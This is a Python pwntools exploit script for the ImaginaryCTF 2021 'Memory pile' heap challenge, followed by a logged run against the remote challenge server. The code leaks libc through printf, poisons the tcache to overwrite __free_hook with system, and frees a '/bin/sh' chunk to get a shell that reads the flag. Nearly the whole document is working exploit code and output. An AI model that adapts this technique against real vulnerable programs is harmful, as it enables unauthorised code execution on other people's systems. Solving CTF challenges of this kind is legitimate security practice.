from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './memory_pile'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "chal.imaginaryctf.org"
  PORT = 42007
  s = remote(HOST, PORT)
  libc = ELF('./libc-2.27.so')
else:
  s = process(BINARY)
  libc = elf.libc

def Acquire(idx):
  s.sendlineafter("wisely > ", "1")
  s.sendlineafter("responsibility > ", str(idx))

def Release(idx):
  s.sendlineafter("wisely > ", "2")
  s.sendlineafter("responsibility > ", str(idx))

def Fill(idx, data):
  s.sendlineafter("wisely > ", "3")
  s.sendlineafter("responsibility > ", str(idx))
  s.sendlineafter("boss > ", data)

s.recvuntil("if you manage to unwrap it...\n")
printf_addr = int(s.recvuntil("\n"), 16)
libc_base   = printf_addr - libc.sym.printf
free_hook   = libc_base + libc.sym.__free_hook
system_addr = libc_base + libc.sym.system
print "printf_addr =", hex(printf_addr)
print "libc_base   =", hex(libc_base)

Acquire(0)
Acquire(1)
Release(1)
Release(0)

# Poisoning tcache
Fill(0, p64(free_hook))

# write system address in __free_hook 
Acquire(2)
Acquire(3)
Fill(3, p64(system_addr))

# Start /bin/sh
Fill(2, "/bin/sh\x00")
Release(2)

s.interactive()

'''
mito@ubuntu:~/CTF/ImaginaryCTF_2021/Pwn_Memory_pile_300$ python solve.py r
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Memory_pile_300/memory_pile'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
    RUNPATH:  './'
[+] Opening connection to chal.imaginaryctf.org on port 42007: Done
[*] '/home/mito/CTF/ImaginaryCTF_2021/Pwn_Memory_pile_300/libc-2.27.so'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
printf_addr = 0x7f2b6994af00
libc_base   = 0x7f2b698e6000
[*] Switching to interactive mode
$ id
uid=1000 gid=1000 groups=1000
$ ls -l
total 2184
-rw-r--r-- 1 nobody nogroup      29 Jul 26 14:33 flag.txt
-rwxr-xr-x 1 nobody nogroup  170960 Jul 26 14:33 ld-2.27.so
-rwxr-xr-x 1 nobody nogroup 2030544 Jul 26 14:33 libc-2.27.so
-rwxr-xr-x 1 nobody nogroup   25328 Jul 26 14:33 run
$ cat flag.txt
ictf{hemlock_for_the_tcache}
'''

